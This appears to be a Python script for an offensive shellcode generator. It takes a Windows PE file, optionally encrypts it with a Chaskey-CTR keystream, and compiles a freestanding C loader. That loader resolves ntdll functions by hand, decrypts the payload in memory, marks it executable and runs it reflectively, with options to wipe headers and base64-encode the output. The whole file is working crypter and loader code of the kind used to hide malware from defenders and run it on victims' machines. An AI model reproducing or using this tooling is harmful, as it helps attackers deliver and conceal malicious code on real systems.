import os
import sys
import subprocess
import textwrap
import base64
import struct

# Chaskey block & PRF to generate CTR keystream
def ROTL(x, b):
    return ((x >> (32 - b)) | (x << b)) & 0xFFFFFFFF

def chaskey_block(v, k):
    v0, v1, v2, v3 = v
    k0, k1, k2, k3 = k
    v0 ^= k0; v1 ^= k1; v2 ^= k2; v3 ^= k3
    for _ in range(8):
        v0 = (v0 + v1) & 0xFFFFFFFF
        v1 = ROTL(v1, 5) ^ v0
        v0 = ROTL(v0, 16)
        v2 = (v2 + v3) & 0xFFFFFFFF
        v3 = ROTL(v3, 8) ^ v2
        v0 = (v0 + v3) & 0xFFFFFFFF
        v3 = ROTL(v3, 13) ^ v0
        v2 = (v2 + v1) & 0xFFFFFFFF
        v1 = ROTL(v1, 7) ^ v2
        v2 = ROTL(v2, 16)
    v0 ^= k0; v1 ^= k1; v2 ^= k2; v3 ^= k3
    return (v0, v1, v2, v3)

def chaskey_prf(key_bytes, block_bytes):
    k = struct.unpack("<4I", key_bytes)
    v = struct.unpack("<4I", block_bytes)
    out = chaskey_block(v, k)
    return struct.pack("<4I", *out)

def chaskey_ctr_keystream(key, nonce, length):
    stream = bytearray()
    ctr = 0
    while len(stream) < length:
        block = nonce + struct.pack("<I", ctr) + b"\x00\x00\x00\x00"
        stream.extend(chaskey_prf(key, block))
        ctr = (ctr + 1) & 0xFFFFFFFF
    return bytes(stream[:length])

# --- CLI and I/O ---
if len(sys.argv) < 3:
    print(f"Usage: {os.path.basename(sys.argv[0])} <input_pe> <output.bin> [-exe|-dll] [-wipeheaders] [-encrypt] [-base64]")
    sys.exit(1)

args = [a.lower() for a in sys.argv]
input_pe = sys.argv[1]
output_bin = sys.argv[2]
use_exe = "-exe" in args
use_dll = "-dll" in args
wipe_headers = "-wipeheaders" in args or "-wipe" in args
use_encrypt = "-encrypt" in args or "-enc" in args
use_b64 = "-base64" in args or "-b64" in args

with open(input_pe, "rb") as f:
    pe_bytes = f.read()

if len(pe_bytes) < 2 or pe_bytes[:2] != b"MZ":
    print("[-] Input is not a valid PE")
    sys.exit(1)

if use_encrypt:
    chaskey_key = os.urandom(16)
    chaskey_nonce = os.urandom(8)
    keystream = chaskey_ctr_keystream(chaskey_key, chaskey_nonce, len(pe_bytes))
    data_bytes = bytes(p ^ k for p, k in zip(pe_bytes, keystream))
else:
    data_bytes = pe_bytes

hex_array = ", ".join(f"0x{b:02x}" for b in data_bytes)

if use_encrypt:
    key_literal = ", ".join(f"0x{b:02x}" for b in chaskey_key)
    nonce_literal = ", ".join(f"0x{b:02x}" for b in chaskey_nonce)
    c_source = textwrap.dedent(f"""
    #include "pe_loader.h"
    
    typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
        HANDLE ProcessHandle,
        PVOID *BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );

    typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
        HANDLE ProcessHandle,
        PVOID *BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    );
    
    typedef unsigned long u32;

    __attribute__((section(".text")))
    unsigned char enc_blob[] = {{
        {hex_array}
    }};

    __attribute__((section(".text")))
    unsigned char chaskey_key[16] = {{{key_literal}}};

    __attribute__((section(".text")))
    unsigned char chaskey_nonce[8] = {{{nonce_literal}}};

    #define ROTL(x,b) (((x) >> (32 - (b))) | ((x) << (b)))

    void chaskey_block(u32 v[4], u32 k[4]) {{
        int i;
        for(i=0;i<4;i++) v[i] ^= k[i];
        for(i=0;i<8;i++) {{
            v[0] += v[1]; v[1] = ROTL(v[1],5) ^ v[0]; v[0] = ROTL(v[0],16);
            v[2] += v[3]; v[3] = ROTL(v[3],8) ^ v[2];
            v[0] += v[3]; v[3] = ROTL(v[3],13) ^ v[0];
            v[2] += v[1]; v[1] = ROTL(v[1],7) ^ v[2]; v[2] = ROTL(v[2],16);
        }}
        for(i=0;i<4;i++) v[i] ^= k[i];
    }}

    void chaskey_prf(unsigned char in[16], unsigned char out[16]) {{
        u32 v[4], k[4];
        int i;
        for(i=0;i<4;i++) {{
            v[i] = ((u32*)in)[i];
            k[i] = ((u32*)chaskey_key)[i];
        }}
        chaskey_block(v, k);
        for(i=0;i<4;i++) ((u32*)out)[i] = v[i];
    }}

      void decrypt_blob(unsigned char *dst) {{
          u32 ctr = 0;
          unsigned char blk[16], ks[16];
          unsigned int i, j;
      
          for (i = 0; i < sizeof(enc_blob); i += 16) {{
              for (j = 0; j < 8; j++) blk[j] = chaskey_nonce[j];
              *(u32 *)(blk + 8)  = ctr;
              *(u32 *)(blk + 12) = 0;
      
              chaskey_prf(blk, ks);
      
              for (j = 0; j < 16 && (i + j) < sizeof(enc_blob); j++)
                  dst[i + j] = enc_blob[i + j] ^ ks[j];
      
              ctr++;
          }}
      }}

    __attribute__((section(".text.start")))
    void _start(void) {{
        HMODULE hNtdll = myLoadLibraryA(ntdll_dll);

        SIZE_T size = sizeof(enc_blob);
        PVOID pe = NULL;

        NtAllocateVirtualMemory_t NtAllocateVirtualMemory =
            (NtAllocateVirtualMemory_t)myGetProcAddress(hNtdll, ntallocatevirtualmemory);

        NtAllocateVirtualMemory(
            (HANDLE)-1,
            &pe,
            0,
            &size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE
        );

        decrypt_blob((unsigned char*)pe);

        ULONG oldProt;
        
        NtProtectVirtualMemory_t NtProtectVirtualMemory =
            (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);
        
        NtProtectVirtualMemory(
            (HANDLE)-1,
            &pe,
            &size,
            PAGE_EXECUTE_READ,
            &oldProt
        );

        ExecuteFromMemory(pe);
    }}
    """)

else:
    c_source = textwrap.dedent(f"""
    #include "pe_loader.h"

    __attribute__((section(".text")))
    unsigned char pe_blob[] = {{
        {hex_array}
    }};

    __attribute__((section(".text.start")))
    void _start(void) {{
        ExecuteFromMemory(pe_blob);
    }}
    """)

output_file = output_bin if use_exe or use_dll else "temp_compile.exe"
compile_cmd = [
    "x86_64-w64-mingw32-gcc", "-x", "c", "-",
    "-nostdlib", "-nostartfiles", "-ffreestanding",
    "-Wl,-subsystem,windows", "-e", "_start",
    "-Os", "-s",
    "-fno-ident",
    "-fno-asynchronous-unwind-tables",
    "-mno-stack-arg-probe",
    "-o", output_file
]

if wipe_headers:
    compile_cmd.extend(["-DWIPEIMAGE", "-DWIPEHEADERS"])
elif use_encrypt:
    compile_cmd.extend(["-DWIPEIMAGE"])

if use_dll:
    compile_cmd.extend(["-shared", "-Wl,--exclude-all-symbols"])
elif not use_exe and not use_dll:
    compile_cmd.extend(["-T", "linker.ld"])

try:
    subprocess.run(
        compile_cmd,
        input=c_source.encode(),
        check=True
    )

    if not use_exe and not use_dll:
        subprocess.run(
            ["objcopy", "-O", "binary", "--only-section=.text", output_file, output_bin],
            check=True
        )
        os.remove(output_file)

        if use_b64:
            with open(output_bin, "rb") as f:
                b = f.read()
            with open(output_bin, "w") as f:
                f.write(base64.b64encode(b).decode())
            print(f"[+] Base64 shellcode generated: {output_bin}")
        else:
            print(f"[+] Shellcode generated: {output_bin}")

    elif use_dll:
        if use_b64:
            with open(output_file, "rb") as f:
                b = f.read()
            with open(output_file, "w") as f:
                f.write(base64.b64encode(b).decode())
            print(f"[+] Base64 DLL generated: {output_file}")
        else:
            print(f"[+] DLL generated: {output_file}")

    else:
        if use_b64:
            with open(output_file, "rb") as f:
                b = f.read()
            with open(output_file, "w") as f:
                f.write(base64.b64encode(b).decode())
            print(f"[+] Base64 executable generated: {output_file}")
        else:
            print(f"[+] Executable generated: {output_file}")

except subprocess.CalledProcessError:
    sys.exit(1)
